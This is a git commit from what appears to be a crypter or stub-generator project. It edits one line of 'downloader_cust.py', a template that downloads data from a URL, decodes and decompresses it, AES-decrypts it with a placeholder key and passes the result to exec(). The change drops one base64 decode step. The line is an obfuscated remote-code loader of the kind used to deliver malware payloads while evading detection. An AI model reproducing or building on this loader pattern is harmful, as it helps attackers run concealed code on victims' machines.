4bb897e507bd290aa7ee595f90751bf95844fd67
d4rkcat <d4rkcat@yandex.com>
2014-12-11 03:52:34 +0000

    code

--- stubs/downloader_cust.py
+++ stubs/downloader_cust.py
@@ -1,1 +1,1 @@
-exec(***AESVAR***.new("***AESKEY***").decrypt(***B64D***(***BZ2***(***B64D***(***URLO***(url).read()[***OFFSET***:])))).rstrip('{'))
+exec(***AESVAR***.new("***AESKEY***").decrypt(***B64D***(***BZ2***(***URLO***(url).read()[***OFFSET***:]))).rstrip('{'))
